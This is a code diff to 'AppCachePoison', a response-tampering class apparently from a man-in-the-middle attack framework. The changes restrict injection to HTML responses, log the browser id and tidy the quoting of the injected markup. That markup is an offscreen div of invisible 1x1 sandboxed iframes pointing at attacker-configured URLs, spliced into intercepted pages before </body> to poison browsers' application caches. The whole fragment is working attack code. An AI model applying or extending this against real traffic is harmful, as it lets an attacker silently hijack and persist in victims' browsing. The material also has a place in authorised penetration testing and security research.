@@ -86,6 +86,8 @@ class AppCachePoison(DummyResponseTamperer):
             return data
         if browser_id in self.mass_poisoned_browsers: #already poisoned
             return data
+        if not headers.hasHeader('content-type') or not re.search('html(;|$)', headers.getRawHeaders('content-type')[0]): #not HTML
+            return data
         if 'mass_poison_useragent_match' in self.config and not "user-agent" in req_headers:
             return data
         if not re.search(self.config['mass_poison_useragent_match'], req_headers['user-agent']): #different UA
@@ -93,18 +95,18 @@ class AppCachePoison(DummyResponseTamperer):
         if not re.search(self.config['mass_poison_url_match'], url): #different url
             return data
         
-        logging.log(logging.WARNING, "Adding AppCache mass poison for URL %s, ip %s" % (url, ip))
+        logging.log(logging.WARNING, "Adding AppCache mass poison for URL %s, id %s" % (url, browser_id))
         appendix = self.getMassPoisonHtml()
         data = re.sub(re.compile("</body>",re.IGNORECASE),appendix + "</body>", data)
         self.mass_poisoned_browsers.append(browser_id) # mark to avoid mass spoofing for this ip
         return data
 
     def getMassPoisonHtml(self):
-        html = "<div style=position:absolute;left:-100px>"
+        html = "<div style=\"position:absolute;left:-100px\">"
         for i in self.config:
             if isinstance(self.config[i], dict):
                 if self.config[i].has_key('tamper_url'):
-                    html += "<iframe sandbox style=opacity:0;visibility:hidden width=1 height=1 src=\"" + self.config[i]['tamper_url'] + "\"></iframe>" 
+                    html += "<iframe sandbox=\"\" style=\"opacity:0;visibility:hidden\" width=\"1\" height=\"1\" src=\"" + self.config[i]['tamper_url'] + "\"></iframe>" 
 
         return html + "</div>"
         
